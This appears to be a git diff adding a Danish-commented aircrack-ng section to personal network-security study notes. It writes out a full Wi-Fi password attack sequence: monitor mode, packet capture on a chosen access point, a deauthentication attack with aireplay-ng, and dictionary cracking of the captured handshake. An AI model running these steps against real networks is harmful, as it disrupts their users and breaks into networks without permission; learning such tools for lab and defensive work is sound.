@@ -58,5 +58,11 @@ sudo tcpdump udp port 53 -v
 
 ## aircrack-ng
 ```shell
-
+sudo airmon-ng check kill # dræber alle devices der kan have indflydelse på netværket
+sudo airmon-ng start wlan0 # starter netværkskortets monitoring mode
+ifconfig # vi skal finde navnet på vores monitor netværk
+sudo airodump-ng <netværksnavn> # begynder overvågning
+sudo airodump-ng --bssid <MAC på AccessPoint> --channel <channel-nummer> --write <gemt fil med packets> <netværkskort> # fanger packets fra det valgte wifi
+sudo aireplay-ng --deauth 50 -a <MAC på accesspoint> <netværkskort> # sender et deauth attack
+sudo aircrack-ng <navn på gemt fil med packets> -w <en valgt wordlist> # cracker wifi password
 ```
